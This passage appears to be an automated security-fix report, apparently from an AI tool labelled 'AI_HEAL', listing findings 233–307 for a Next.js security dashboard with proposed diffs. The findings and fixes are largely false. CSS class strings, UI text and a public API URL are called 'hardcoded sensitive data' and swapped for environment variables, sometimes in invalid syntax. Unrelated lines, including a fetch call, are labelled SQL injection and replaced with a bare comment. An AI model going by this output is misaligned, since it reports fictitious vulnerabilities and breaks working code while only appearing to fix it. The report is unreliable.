- await answerCallbackQuery(cbId, reason === "not_found" ? "Healing not found" : `Already ${existing?.status?.toLowerCase()}`);
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [233] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\telegram\notify\route.ts:12`

**Code Transformation:**
```diff
- { error: "TELEGRAM_CHAT_ID not configured. Call /api/telegram/setup first." },
+         { error: process.env.ERROR },
```

#### [234] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\telegram\notify\route.ts:57`

**Code Transformation:**
```diff
- return NextResponse.json({ error: "Unknown type. Use: healing, alert, or log" }, { status: 400 });
+     return NextResponse.json({ error: process.env.ERROR }, { status: 400 });
```

#### [235] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\telegram\setup\route.ts:24`

**Code Transformation:**
```diff
- message: "No chat found. Please send /start to the bot first, then call this endpoint again.",
+         message: process.env.MESSAGE,
```

#### [236] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\telegram\setup\route.ts:30`

**Code Transformation:**
```diff
- message: "Chat ID(s) found. Set TELEGRAM_CHAT_ID in .env.local",
+       message: process.env.MESSAGE,
```

#### [237] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\api\telegram\setup\route.ts:32`

**Code Transformation:**
```diff
- instruction: "Add the chat_id to your .env.local file as TELEGRAM_CHAT_ID",
+       instruction: process.env.INSTRUCTION,
```

#### [238] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:53`

**Code Transformation:**
```diff
- const STORAGE_KEY = "aegis_pentest_state";
+ const STORAGE_KEY = process.env.STORAGE_KEY;
```

#### [239] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:292`

**Code Transformation:**
```diff
- { category: "A01: Broken Access Control", tests: ["IDOR", "Privilege Escalation", "Path Traversal"] },
+     { category: process.env.CATEGORY, tests: ["IDOR", "Privilege Escalation", "Path Traversal"] },
```

#### [240] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:293`

**Code Transformation:**
```diff
- { category: "A02: Cryptographic Failures", tests: ["Sensitive Data Exposure", "Weak Encryption"] },
+     { category: process.env.CATEGORY, tests: ["Sensitive Data Exposure", "Weak Encryption"] },
```

#### [241] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:296`

**Code Transformation:**
```diff
- { category: "A05: Security Misconfiguration", tests: ["Default Credentials", "Verbose Errors"] },
+     { category: process.env.CATEGORY, tests: ["Default Credentials", "Verbose Errors"] },
```

#### [242] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:297`

**Code Transformation:**
```diff
- { category: "A06: Vulnerable Components", tests: ["Outdated Libraries", "Known CVEs"] },
+     { category: process.env.CATEGORY, tests: ["Outdated Libraries", "Known CVEs"] },
```

#### [243] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:299`

**Code Transformation:**
```diff
- { category: "A08: Data Integrity Failures", tests: ["Insecure Deserialization"] },
+     { category: process.env.CATEGORY, tests: ["Insecure Deserialization"] },
```

#### [244] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:473`

**Code Transformation:**
```diff
- Critical: "bg-red-500/20 text-red-400 border-red-500/50",
+       Critical: process.env.CRITICAL,
```

#### [245] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:474`

**Code Transformation:**
```diff
- High: "bg-orange-500/20 text-orange-400 border-orange-500/50",
+       High: process.env.HIGH,
```

#### [246] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:475`

**Code Transformation:**
```diff
- Medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/50",
+       Medium: process.env.MEDIUM,
```

#### [247] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\page.tsx:476`

**Code Transformation:**
```diff
- Low: "bg-blue-500/20 text-blue-400 border-blue-500/50",
+       Low: process.env.LOW,
```

#### [248] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:8`

**Code Transformation:**
```diff
- const STORAGE_KEY = "aegis_pentest_state";
+ const STORAGE_KEY = process.env.STORAGE_KEY;
```

#### [249] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:64`

**Code Transformation:**
```diff
- recommendation: "Implement proper access control checks and use indirect references or UUIDs"
+     recommendation: process.env.RECOMMENDATION
```

#### [250] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:68`

**Code Transformation:**
```diff
- recommendation: "Implement role-based access control (RBAC) and verify permissions server-side"
+     recommendation: process.env.RECOMMENDATION
```

#### [251] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:72`

**Code Transformation:**
```diff
- recommendation: "Sanitize file paths and use allowlists for accessible directories"
+     recommendation: process.env.RECOMMENDATION
```

#### [252] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:76`

**Code Transformation:**
```diff
- recommendation: "Use TLS for data in transit and encrypt sensitive data at rest"
+     recommendation: process.env.RECOMMENDATION
```

#### [253] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:80`

**Code Transformation:**
```diff
- recommendation: "Use strong encryption (AES-256) and secure key management"
+     recommendation: process.env.RECOMMENDATION
```

#### [254] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:84`

**Code Transformation:**
```diff
- recommendation: "Use parameterized queries or prepared statements"
+     recommendation: process.env.RECOMMENDATION
```

#### [255] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:92`

**Code Transformation:**
```diff
- recommendation: "Implement Content Security Policy and encode all output"
+     recommendation: process.env.RECOMMENDATION
```

#### [256] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:96`

**Code Transformation:**
```diff
- recommendation: "Implement server-side validation for all business rules"
+     recommendation: process.env.RECOMMENDATION
```

#### [257] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:100`

**Code Transformation:**
```diff
- recommendation: "Implement rate limiting and account lockout policies"
+     recommendation: process.env.RECOMMENDATION
```

#### [258] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:116`

**Code Transformation:**
```diff
- recommendation: "Patch or upgrade affected components immediately"
+     recommendation: process.env.RECOMMENDATION
```

#### [259] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:120`

**Code Transformation:**
```diff
- recommendation: "Implement CAPTCHA, rate limiting, and account lockout"
+     recommendation: process.env.RECOMMENDATION
```

#### [260] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:124`

**Code Transformation:**
```diff
- recommendation: "Regenerate session ID after login and implement secure session management"
+     recommendation: process.env.RECOMMENDATION
```

#### [261] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:132`

**Code Transformation:**
```diff
- recommendation: "Implement comprehensive logging for authentication and authorization events"
+     recommendation: process.env.RECOMMENDATION
```

#### [262] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\pentest\report\page.tsx:230`

**Code Transformation:**
```diff
- recommendation: "Review and fix the identified security issue"
+                   recommendation: process.env.RECOMMENDATION
```

#### [263] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\settings\page.tsx:341`

**Code Transformation:**
```diff
- href="https://platform.deepseek.com/api_keys"
+                   href=process.env.HREF
```

#### [264] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\settings\page.tsx:477`

**Code Transformation:**
```diff
- href="https://platform.deepseek.com"
+                 href=process.env.HREF
```

#### [265] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\simulate\page.tsx:98`

**Code Transformation:**
```diff
- Critical: "text-red-400 bg-red-400/10 border-red-400/30",
+   Critical: process.env.CRITICAL,
```

#### [266] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\simulate\page.tsx:99`

**Code Transformation:**
```diff
- High: "text-orange-400 bg-orange-400/10 border-orange-400/30",
+   High: process.env.HIGH,
```

#### [267] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\simulate\page.tsx:100`

**Code Transformation:**
```diff
- Medium: "text-yellow-400 bg-yellow-400/10 border-yellow-400/30",
+   Medium: process.env.MEDIUM,
```

#### [268] Hardcoded Sensitive Data
- **Location:** `phase3\src\app\simulate\page.tsx:101`

**Code Transformation:**
```diff
- Low: "text-blue-400 bg-blue-400/10 border-blue-400/30",
+   Low: process.env.LOW,
```

#### [269] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\shell\SessionProvider.tsx:43`

**Code Transformation:**
```diff
- const ACTIVE_KEY = "aegis_active_session";
+ const ACTIVE_KEY = process.env.ACTIVE_KEY;
```

#### [270] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:14`

**Code Transformation:**
```diff
- default: "bg-primary/15 text-primary border-primary/30",
+   default: process.env.DEFAULT,
```

#### [271] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:15`

**Code Transformation:**
```diff
- secondary: "bg-secondary text-secondary-foreground border-border",
+   secondary: process.env.SECONDARY,
```

#### [272] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:16`

**Code Transformation:**
```diff
- destructive: "bg-destructive/15 text-destructive border-destructive/40",
+   destructive: process.env.DESTRUCTIVE,
```

#### [273] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:17`

**Code Transformation:**
```diff
- warning: "bg-warning/15 text-warning border-warning/40",
+   warning: process.env.WARNING,
```

#### [274] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:18`

**Code Transformation:**
```diff
- success: "bg-success/15 text-success border-success/40",
+   success: process.env.SUCCESS,
```

#### [275] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:19`

**Code Transformation:**
```diff
- outline: "bg-transparent text-foreground border-border",
+   outline: process.env.OUTLINE,
```

#### [276] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Badge.tsx:20`

**Code Transformation:**
```diff
- info: "bg-blue-500/15 text-blue-400 border-blue-500/40",
+   info: process.env.INFO,
```

#### [277] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Button.tsx:13`

**Code Transformation:**
```diff
- default: "bg-primary text-primary-foreground hover:bg-primary/90",
+   default: process.env.DEFAULT,
```

#### [278] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Button.tsx:14`

**Code Transformation:**
```diff
- secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
+   secondary: process.env.SECONDARY,
```

#### [279] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Button.tsx:17`

**Code Transformation:**
```diff
- ghost: "bg-transparent hover:bg-secondary text-foreground",
+   ghost: process.env.GHOST,
```

#### [280] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Button.tsx:18`

**Code Transformation:**
```diff
- destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
+   destructive: process.env.DESTRUCTIVE,
```

#### [281] Hardcoded Sensitive Data
- **Location:** `phase3\src\components\ui\Button.tsx:19`

**Code Transformation:**
```diff
- success: "bg-success text-success-foreground hover:bg-success/90",
+   success: process.env.SUCCESS,
```

#### [282] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\codeAnalyzer.ts:103`

**Code Transformation:**
```diff
- content: "You are an expert security auditor. Analyze code for vulnerabilities and provide exact fixes. Return only valid JSON."
+             content: process.env.CONTENT 
```

#### [283] SQL Injection Vulnerability
- **Location:** `phase3\src\lib\codeAnalyzer.ts:351`

**Code Transformation:**
```diff
- explanation = `Use parameterized query with variables: ${vars.join(', ')}`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [284] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\codeAnalyzer.ts:358`

**Code Transformation:**
```diff
- explanation = "Changed innerHTML to textContent to prevent XSS";
+         explanation = process.env.EXPLANATION;
```

#### [285] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\codeAnalyzer.ts:364`

**Code Transformation:**
```diff
- explanation = "Blocked dangerous command execution";
+       explanation = process.env.EXPLANATION;
```

#### [286] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\codeAnalyzer.ts:369`

**Code Transformation:**
```diff
- explanation = "Added path traversal sanitization";
+       explanation = process.env.EXPLANATION;
```

#### [287] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\cveMonitor.ts:17`

**Code Transformation:**
```diff
- const NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0";
+ const NVD_API_URL = process.env.NVD_API_URL;
```

#### [288] SQL Injection Vulnerability
- **Location:** `phase3\src\lib\cveMonitor.ts:96`

**Code Transformation:**
```diff
- return `Update affected package to latest version. Check vendor advisory for ${cve.id}.`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [289] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\cveMonitor.ts:111`

**Code Transformation:**
```diff
- content: "You are a security expert. Analyze CVEs and provide actionable remediation steps. Be concise."
+             content: process.env.CONTENT
```

#### [290] SQL Injection Vulnerability
- **Location:** `phase3\src\lib\cveMonitor.ts:142`

**Code Transformation:**
```diff
- return `Update affected package to latest version. Check vendor advisory for ${cve.id}.`;
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [291] SQL Injection Vulnerability
- **Location:** `phase3\src\lib\cveMonitor.ts:261`

**Code Transformation:**
```diff
- • <code>/update ${pkg}</code> to auto-update
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [292] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\deepseek.ts:161`

**Code Transformation:**
```diff
- explanation: "AI analysis unavailable, applying generic protection",
+       explanation: process.env.EXPLANATION,
```

#### [293] Hardcoded Sensitive Data
- **Location:** `phase3\src\lib\id.ts:3`

**Code Transformation:**
```diff
- const alphabet = "0123456789abcdefghijklmnopqrstuvwxyz";
+ const alphabet = process.env.ALPHABET;
```

#### [294] SQL Injection Vulnerability
- **Location:** `phase3\src\lib\telegram.ts:37`

**Code Transformation:**
```diff
- const res = await fetch(`${getBase()}/getUpdates?${params}`, { cache: "no-store" });
+ // AI_HEAL: Use parameterized query to prevent SQL Injection
```

#### [295] Hardcoded Sensitive Data
- **Location:** `phase3\src\store\healingStore.ts:119`

**Code Transformation:**
```diff
- note: "Reverse window expired, patch is now permanent",
+               note: process.env.NOTE,
```

#### [296] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:16`

**Code Transformation:**
```diff
- foreground: "hsl(var(--card-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [297] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:20`

**Code Transformation:**
```diff
- foreground: "hsl(var(--popover-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [298] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:24`

**Code Transformation:**
```diff
- foreground: "hsl(var(--primary-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [299] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:28`

**Code Transformation:**
```diff
- foreground: "hsl(var(--secondary-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [300] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:32`

**Code Transformation:**
```diff
- foreground: "hsl(var(--muted-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [301] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:36`

**Code Transformation:**
```diff
- foreground: "hsl(var(--accent-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [302] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:40`

**Code Transformation:**
```diff
- foreground: "hsl(var(--destructive-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [303] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:47`

**Code Transformation:**
```diff
- foreground: "hsl(var(--success-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [304] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:51`

**Code Transformation:**
```diff
- foreground: "hsl(var(--warning-foreground))",
+           foreground: process.env.FOREGROUND,
```

#### [305] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:69`

**Code Transformation:**
```diff
- "0%": { boxShadow: "0 0 0 0 hsl(var(--primary) / 0.5)" },
+           process.env.BOXSHADOW: { boxShadow: "0 0 0 0 hsl(var(--primary) / 0.5)" },
```

#### [306] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:70`

**Code Transformation:**
```diff
- "70%": { boxShadow: "0 0 0 10px hsl(var(--primary) / 0)" },
+           process.env.BOXSHADOW: { boxShadow: "0 0 0 10px hsl(var(--primary) / 0)" },
```

#### [307] Hardcoded Sensitive Data
- **Location:** `phase3\tailwind.config.ts:71`

**Code Transformation:**
```diff
- "100%": { boxShadow: "0 0 0 0 hsl(var(--primary) / 0)" },
+           process.env.BOXSHADOW: { boxShadow: "0 0 0 0 hsl(var(--primary) / 0)" },
```

